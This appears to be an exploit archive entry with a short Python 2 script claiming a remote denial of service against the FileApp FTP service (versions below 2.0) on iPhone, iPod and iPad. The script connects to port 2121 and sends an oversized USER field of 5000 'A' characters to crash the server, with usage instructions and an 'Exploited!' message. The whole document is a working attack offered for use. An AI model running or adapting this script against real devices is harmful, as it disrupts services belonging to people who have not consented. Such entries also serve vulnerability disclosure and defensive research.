# Title : FileApp < 2.0 FTP Denial of Service for iPhone,iPod,iPad
# Date : 02/10/2010
# Author : m0ebiusc0de
# Software : http://www.digidna.net/products/fileapp/download
# Version : FileApp < v.2.0, iPad 3.2.2 (jailed)
# Tested on : Windows XP PRO SP3

#!/usr/bin/python

# FileApp < v.2.0 FTP Remote DoS exploit
# tested on iPad 3.2.2

import socket
import sys

def Usage():
    print ("Usage:  ./FileApp.py <serv_ip>\n")
    print ("Example:./FileApp 10.10.10.10\n")

if len(sys.argv) <> 2:
        Usage()
        sys.exit(1)
else:
    hostname = sys.argv[1]
    username = "\x41" * 5000
    passwd = "a@b.com"
    #username = "anonymous"
    #passwd = "\x41" * 5000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((hostname, 2121))
        print "[+] Connecting to the target.."
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    sock.send("USER %s\r\n" %username)
    sock.send("PASS %s\r\n" %passwd)
    sock.close()
    print "[+] Exploited!"
    sys.exit(0);